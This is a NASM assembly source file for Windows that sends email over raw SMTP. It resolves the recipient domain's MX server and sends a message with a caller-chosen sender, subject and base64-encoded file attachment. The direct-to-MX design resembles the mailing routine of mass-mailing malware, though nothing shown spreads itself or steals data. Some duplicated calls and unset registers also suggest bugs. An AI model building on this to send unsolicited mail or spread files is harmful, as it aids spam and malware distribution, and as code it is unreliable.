import  connect         ws2_32.dll
extern  connect     

%include "network.inc"
%include "dns.inc"
%include "base64.inc"

;------------------------------------------------------------------------------
;   PARMS:
;           eax =   offset of Address
;           ebx =   offset of Sender           
;           ecx =   offset of E-Mail 
;           edx =   offset of Subject
;           esi =   offset of filename to attach ( NULL = no file to attach )
;           edi =   offset of name of attachment 

%define ADDR        ebp-0x04      
%define SENDER      ebp-0x08
%define EMAIL       ebp-0x0C
%define SOCKET      ebp-0x10
%define HOST        ebp-0xFC  
%define USER        ebp-0x17C
%define SMTP        ebp-0x1FC
%define BUFF        ebp-0x3FC
%define ATTACHMENT  ebp-0x400
%define AT_NAME     ebp-0x404
%define SUBJECT     ebp-0x408

;------------------------------------------------------------------------------
clean_buffer:
    lea     edi, [BUFF]
    mov     ecx, 0x200
    mov     al,  0x0
    call    memset

    ret
    
;------------------------------------------------------------------------------    
send_server:
    call    strlen
    push    dword 0x0
    push    ecx
    push    esi
    push    dword [SOCKET]
    call    [send]
    
    ret    

;------------------------------------------------------------------------------    
recv_server:
    push    dword 0x0                   ; Read Server answere
    push    dword 0x200
    lea     eax, [BUFF]
    push    eax
    push    dword [SOCKET]
    call    [recv]    
    
    ret    

;------------------------------------------------------------------------------
send_mail:
    push    ebp
    mov     ebp, esp
    sub     esp, 0x408
    
    push    eax
    push    ebx
    push    ecx
    push    edx
    push    esi
    push    edi
    
    mov     [ADDR],     eax             ; store parameter
    mov     [SENDER],   ebx
    mov     [EMAIL],    ecx  
    mov     [SUBJECT],  edx
    mov     [ATTACHMENT], esi
    mov     [AT_NAME], edi
          
    mov     esi, [ADDR]                 ; parse username & hostname
    lea     edi, [USER]
        
.parse_user:
    lodsb
    cmp     al, 0x40
    je      near .prase_user_fine
    stosb               
    jmp     near .parse_user
    
.prase_user_fine:
    mov     al, 0x0
    stosb
    lea     edi,[HOST]
           
.parse_host:  
    lodsb
    stosb
    cmp     al, 0x0
    jne     near .parse_host      
   
    lea     eax, [HOST]                 ; resolve mx record 
    lea     ebx, [SMTP]
    call    resolve_mx
    
    cmp     eax, dword 0x0
    jne     near .send_mail_exit
    
    lea     eax, [SMTP]                 ; try to resolve server by name
    call    inet_resolve
                                  
    cmp     eax, NULL
    je      near .send_mail_exit                      
             
    mov     [EMAIL_SERVER+sockaddr_in.sin_addr], eax

    push    dword 0x0                   ; create socket
    push    dword SOCK_STREAM
    push    dword AF_INET
    call    [socket]
    
    cmp     eax, dword -0x01            ; exit on nosocket
    je      near .send_mail_exit
    
    mov     [SOCKET], eax
    
    push    dword 0x10                  ; connect socket
    push    dword EMAIL_SERVER
    push    dword [SOCKET]        
    call    [connect]
    
    cmp     eax, dword 0x0              ; cleanup on connection faild
    jne     near .send_mail_cleanup    
    
    call    recv_server                 ; read server answere
    
    lea     esi, [T_EHLO]               ; Send Hello
    lea     edi, [BUFF]
    call    strcpy
    lea     esi, [HOST]
    call    strcat
    lea     esi, [T_ENDL]
    call    strcat    
    lea     esi, [BUFF] 
    call    send_server        
    call    recv_server                 
    
    lea     esi, [T_MAIL_FROM]          ; build from string
    lea     edi, [BUFF]
    call    strcpy        
    mov     esi, [SENDER]
    call    strcat    
    lea     esi, [T_BRK_CLOSE]
    call    strcat    
    
    lea     esi, [BUFF]                 ; send from string
    call    send_server
    call    recv_server                 
        
    lea     esi, [T_RCPT_TO]            ; build rcpt to string
    lea     edi, [BUFF]
    call    strcpy
    mov     esi, [ADDR]
    call    strcat
    lea     esi, [T_BRK_CLOSE]
    call    strcat
    
    lea     esi, [BUFF]                 ; send "rcpt to" string
    call    send_server
    call    recv_server                 
    
    lea     esi, [T_DATA]               ; send data string
    call    send_server
    call    recv_server
    
    lea     esi, [T_FROM]               ; build from string
    lea     edi, [BUFF]
    call    strcpy     
    mov     esi, [SENDER]
    call    strcat
    lea     esi, [T_ENDL]
    call    strcat
    
    lea     esi, [BUFF]                 ; send from string
    call    send_server                
    
    lea     esi, [T_SUBJECT]            ; build subject string
    lea     edi, [BUFF]
    call    strcpy     
    mov     esi, [SUBJECT]
    call    strcat
    lea     esi, [T_ENDL]
    call    strcat
    
    lea     esi, [BUFF]                 ; send subject string
    call    send_server         
    
    lea     esi, [T_CONTENT_A]          ; sent content type
    call    send_server     
                     
    mov     esi, [EMAIL]                ; send e-mail data
    call    send_server

    lea     esi, [T_ENDL]               ; send new line
    call    send_server    
    call    send_server
                
    lea     esi, [T_BONDARY]            ; send a bondary
    call    send_server
    
    lea     esi, [T_CONTENT_B]          ; build content type
    lea     edi, [BUFF]
    call    strcpy
    mov     esi, [AT_NAME]
    call    strcat
    lea     esi, [T_ENDL]
    call    strcat
    lea     esi, [T_CONTENT_C]
    call    strcat
    mov     esi, [AT_NAME]
    call    strcat
    lea     esi, [T_ENDL]
    call    strcat
    call    strcat        
    
    lea     esi, [BUFF]                 ; send content type
    call    send_server
    
    mov     eax, [ATTACHMENT]           ; attach file to mail
    call    encode_b64_file
    push    eax
    
    mov     esi, eax
    xor     eax, eax
    
.attach_file:
    lea     edi, [BUFF]
    mov     ecx, 0x4C    
    
.attach_line:
    lodsb
    stosb
    dec     ecx
    dec     ebx
    cmp     ebx, 0x0
    je      near .attach_send_line
    cmp     ecx, 0x0
    jne     near .attach_line
    
.attach_send_line:
    mov     al, 0x0D
    stosb
    mov     al, 0x0A
    stosb
    mov     al, 0x0
    stosb
    push    esi
    lea     esi, [BUFF]
    call    send_server
    pop     esi   
    cmp     ebx, 0x0
    jne     near .attach_file           
    
    call    [LocalFree]
          
    lea     esi, [T_BONDARY_END]        ; send a bondary end
    call    send_server
    
    lea     esi, [T_MAIL_END]           ; fine email
    lea     edi, [BUFF]
    call    send_server
    call    recv_server    
    
    lea     esi, [T_QUIT]               ; Send Quit 
    call    send_server                             
    
.send_mail_cleanup:
    push    dword [SOCKET]
    call    [closesocket]        
    
.send_mail_exit:    
    pop     edi
    pop     esi
    pop     edx
    pop     ecx
    pop     ebx
    pop     eax

    add     esp, 0x408
    pop     ebp
    ret
       
    
%undef ADDR
%undef SENDER
%undef EMAIL  
%undef SOCKET 
%undef USER
%undef HOST
%undef SMTP 
%undef BUFF
%undef ATTACHMENT  
%undef AT_NAME     
%undef SUBJECT     